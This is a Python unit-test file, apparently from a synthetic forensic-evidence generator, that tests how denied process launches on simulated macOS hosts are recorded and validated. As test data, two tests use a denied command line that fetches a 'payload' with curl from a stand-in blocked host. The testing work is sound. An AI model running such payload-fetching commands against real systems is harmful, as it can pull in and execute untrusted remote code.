# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

from dataclasses import replace
from datetime import timedelta
from pathlib import Path
from types import SimpleNamespace

import pytest
import yaml
from pydantic import ValidationError

from evidenceforge.generation.actions.process_policy import record_denied_process_launch
from evidenceforge.generation.checkpoints.state_manager_head import _capture_head, _restore_head
from evidenceforge.generation.engine.typed_handlers.process import handle_process
from evidenceforge.generation.state_manager import StateManager
from evidenceforge.models.exceptions import StateError
from evidenceforge.models.scenario import ProcessEventSpec, Scenario
from evidenceforge.validation.schema import ScenarioValidator
from tests.unit.test_macos_authored_login import _context
from tests.unit.test_macos_foundations import _system
from tests.unit.test_process_execution_state import _START, _process


def test_explicit_denial_preserves_caller_and_allocates_no_child_or_effects() -> None:
    state, caller = _process()
    counters = dict(state._pid_counters)
    result = record_denied_process_launch(
        state,
        actor=caller,
        attempted_at=_START + timedelta(seconds=1),
        image="/usr/bin/curl",
        command_line="curl https://blocked.example.test/payload",
    )
    assert result.actor == caller
    assert state.get_process_identity(caller.hostname, caller.pid) == caller
    assert state._pid_counters == counters
    assert len(state.list_running_processes()) == 1
    assert state.get_process(caller.hostname, caller.pid).last_activity_time == result.attempted_at
    restored = StateManager()
    _restore_head(restored, _capture_head(state))
    assert restored.get_process_identity(caller.hostname, caller.pid) == caller
    assert (
        restored.get_process(caller.hostname, caller.pid).last_activity_time == result.attempted_at
    )


@pytest.mark.parametrize("damage", ["host", "time", "stale", "path"])
def test_denial_rejects_invalid_owners_before_state_changes(damage: str) -> None:
    state, caller = _process("linux" if damage == "host" else "macos")
    before = state.materialization_digest()
    if damage == "stale":
        caller = replace(caller, command_line="different-live-execution")
    with pytest.raises((StateError, ValueError)):
        record_denied_process_launch(
            state,
            actor=caller,
            attempted_at=_START - timedelta(seconds=1)
            if damage == "time"
            else _START + timedelta(seconds=1),
            image="relative" if damage == "path" else "/usr/bin/false",
            command_line="false",
        )
    assert state.materialization_digest() == before


@pytest.mark.parametrize(
    "changes",
    [
        {"parent_ref": None},
        {"process_ref": "impossible-child"},
        {"process_name": "relative"},
        {"outcome": "prompt"},
    ],
)
def test_authored_denial_cannot_invent_a_child_or_promote_a_prompt(
    changes: dict[str, object],
) -> None:
    with pytest.raises(ValidationError):
        ProcessEventSpec.model_validate(
            dict(process_name="/usr/bin/false", parent_ref="caller", outcome="denied") | changes
        )


def test_authored_denial_bypasses_successful_generation_and_records_only_outcome() -> None:
    state, caller = _process()
    system = _system().model_copy(update={"hostname": caller.hostname})
    context = _context(system)
    context = replace(context, time=_START + timedelta(seconds=2), malicious_event={})
    runtime = SimpleNamespace(
        state_manager=state,
        _storyline_process_refs={
            (caller.hostname, context.actor.username, "caller"): (
                caller.pid,
                caller.image,
                caller.object_id,
            )
        },
    )
    spec = ProcessEventSpec(
        process_name="/usr/bin/curl",
        command_line="curl https://blocked.example.test/payload",
        parent_ref="caller",
        outcome="denied",
    )
    result = handle_process(runtime, spec, context)
    assert result["outcome"] == "denied"
    assert result["expected_sources"] == []
    assert "pid" not in result
    assert len(state.list_running_processes()) == 1
    # No ActivityGenerator or emitter exists on this runtime; success/effect paths cannot run.


@pytest.mark.parametrize("reference", [None, "legacy", "wrong-lifetime"])
def test_authored_denial_rejects_missing_legacy_or_reused_reference(reference: str | None) -> None:
    state, caller = _process()
    system = _system().model_copy(update={"hostname": caller.hostname})
    context = _context(system)
    context = replace(context, time=_START + timedelta(seconds=2))
    refs = {}
    if reference is not None:
        refs[(caller.hostname, context.actor.username, "caller")] = (
            (caller.pid, caller.image)
            if reference == "legacy"
            else (caller.pid, caller.image, "old-lifetime")
        )
    runtime = SimpleNamespace(state_manager=state, _storyline_process_refs=refs)
    before = state.materialization_digest()
    with pytest.raises(StateError, match="parent_ref|process_ref"):
        handle_process(
            runtime,
            ProcessEventSpec(process_name="/bin/false", parent_ref="caller", outcome="denied"),
            context,
        )
    assert state.materialization_digest() == before


@pytest.mark.parametrize("damage", [None, "host", "missing-caller"])
def test_denial_scenario_validation_requires_mac_and_exact_prior_caller(damage: str | None) -> None:
    data = yaml.safe_load(Path("scenarios/macos-denied-launch-example/scenario.yaml").read_text())
    if damage == "host":
        data["environment"]["systems"][0]["os"] = "Ubuntu 24.04"
    if damage == "missing-caller":
        data["storyline"] = data["storyline"][1:]
    scenario = Scenario.model_validate(data)
    validator = ScenarioValidator(scenario)
    validator._validate_event_sequences()
    errors = [issue for issue in validator.issues if issue.severity == "error"]
    if damage:
        assert any(
            issue.field_path.endswith("outcome" if damage == "host" else "parent_ref")
            for issue in errors
        )
    else:
        assert not errors
        validator._validate_process_network_pairing()
        validator._validate_evidence_reachability()
        assert not any("PROCESS_CREATE" in issue.message for issue in validator.issues)
